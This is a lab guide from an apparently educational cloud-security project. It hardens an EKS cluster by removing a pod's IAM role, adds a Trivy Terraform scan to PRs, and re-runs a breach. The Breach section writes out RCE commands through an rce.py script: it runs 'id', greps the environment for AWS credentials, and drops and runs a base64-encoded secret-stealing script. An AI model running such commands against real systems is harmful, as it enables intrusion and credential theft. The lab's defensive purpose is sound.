# reat2shell: Secure EKS

[Back](../README.md)

- [reat2shell: Secure EKS](#reat2shell-secure-eks)
  - [Goal](#goal)
  - [Infra Design](#infra-design)
    - [Harden Steps](#harden-steps)
  - [Shift Left: Scan Terraform](#shift-left-scan-terraform)
  - [Infra provision](#infra-provision)
    - [EKS](#eks)
    - [ArgoCD](#argocd)
  - [Breach](#breach)

---

## Goal

1. Create EKS cluster with secure cloud configurations
   - `eks-secure`
2. Create cloud crown jewel — the **RDSsecret in Secrets Manager**.
3. Deploy using `GitOps`
   - `insecure-apps-cloud`

---

## Infra Design

Terraform in a single stack

```txt
infra/
  eks-secure/       # insecure cluster + crown jewel + misconfig — remote state
```

- **Remote state**:
  - uses an **existing** S3 bucket (versioned, encrypted).

- Infrastructure layers built with AWS modules:

| Layers | Features                                                       |
| ------ | -------------------------------------------------------------- |
| VPC    | 2 AZs; subnets: public+private                                 |
| EKS    | node group, OIDC enabled                                       |
| Secret | Secrets Manager holding a fake RDS credential; the crown jewel |
| irsa   | **removed** — no role, no trust policy for the pod             |

**Build order:** `eks-secure/`: vpc → cluster → secret

**Milestone check:**

- `kubectl get nodes` ready;
- from inside the pod, `cat $AWS_WEB_IDENTITY_TOKEN_FILE` → **no such file** (no identity projected).

---

### Harden Steps

Cut the one real cloud misconfig: the pod's broad AWS identity.

| #   | Step                | Description                                                        | Milestone                              |
| --- | ------------------- | ------------------------------------------------------------------ | -------------------------------------- |
| 1   | Drop the IAM role   | Delete the `aws_iam_role.pod` + `*/*` inline policy (no `irsa.tf`) | No role for the pod to assume          |
| 2   | Drop the SA binding | Remove `eks.amazonaws.com/role-arn` from the frontend SA (git)     | No web-identity token projected        |
| 3   | apply + re-breach   | `terraform apply`, re-run Phase 9 attack commands                  | Breach contained at the cloud boundary |

---

## Shift Left: Scan Terraform

Catch IAM misconfig at the PR, before apply — extends the Phase 8 pattern
(`trivy config` on manifests) to the terraform. Reuses the same action, so one
tool covers image + manifest + IaC.

| #   | Step              | What                                                       | Result                          |
| --- | ----------------- | ---------------------------------------------------------- | ------------------------------- |
| 1   | New workflow      | `scan-terraform.yml`, triggered on `infra/**` changes      | TF scanned on every PR          |
| 2   | Trivy config scan | `trivy config infra/eks-secure`, `severity: HIGH,CRITICAL` | Flags wildcard IAM, open config |
| 3   | Gate the PR       | Fail the job on findings                                   | Insecure terraform rejected     |
| 4   | Accept exceptions | `infra/eks-secure/.trivyignore` for reviewed cases         | Intentional configs documented  |

- Mirrors Phase 8: _insecure push gets rejected_ — now for IaC.
- Same `aquasecurity/trivy-action`, same severity gate already used for images
  and manifests.

---

## Infra provision

### EKS

```sh
# init
terraform -chdir=infra/eks-secure init -backend-config=backend.hcl
terraform -chdir=infra/eks-secure init -backend-config=backend.hcl -reconfigure
terraform -chdir=infra/eks-secure init -backend-config=backend.hcl -upgrade

terraform -chdir=infra/eks-secure fmt && terraform -chdir=infra/eks-secure validate
terraform -chdir=infra/eks-secure plan

terraform -chdir=infra/eks-secure apply -auto-approve
terraform -chdir=infra/eks-secure refresh
terraform -chdir=infra/eks-secure output

# clean up
terraform -chdir=infra/eks-secure destroy -auto-approve
```

---

### ArgoCD

```sh
# kubeconfig
aws eks update-kubeconfig --region ca-central-1 --name react2shell-eks-secure
kubectl get nodes

# argocd synced the app-of-apps
kubectl get applications -n argocd

# port-forward the argocd
# get pwd
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 --decode; echo
# port forward
kubectl port-forward service/argocd-server -n argocd 8443:443

kubectl apply -f argocd/insecure-root-app-cloud.yaml

```

---

## Breach

- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`.
- Exploit via `scripts/rce.py`.

```sh
# port forward
kubectl port-forward service/react2shell -n frontend 3000:3000

vi /etc/hosts
# 127.0.0.1 react2shell-insecure.arguswatcher.net

# ##############################
# Attack
# ##############################
# 1. confirm RCE by id — app still vulnerable (code/container/cluster unhardened)
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
# uid=0(root) gid=0(root) groups=0(root)

# 2. look for an AWS identity — none projected (annotation removed, role gone)
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
# (no output) — no AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE

# 3. upload js
b64=$(base64 -w0 scripts/steal_secret.js)
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"

# 4. try to grab the jewel — no credentials to assume any role
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
# fails: no IRSA env (AWS_ROLE_ARN / AWS_WEB_IDENTITY_TOKEN_FILE)
```

**Milestone:** RCE unchanged, but the cloud crown jewel is unreachable — breach
contained at the cloud boundary.
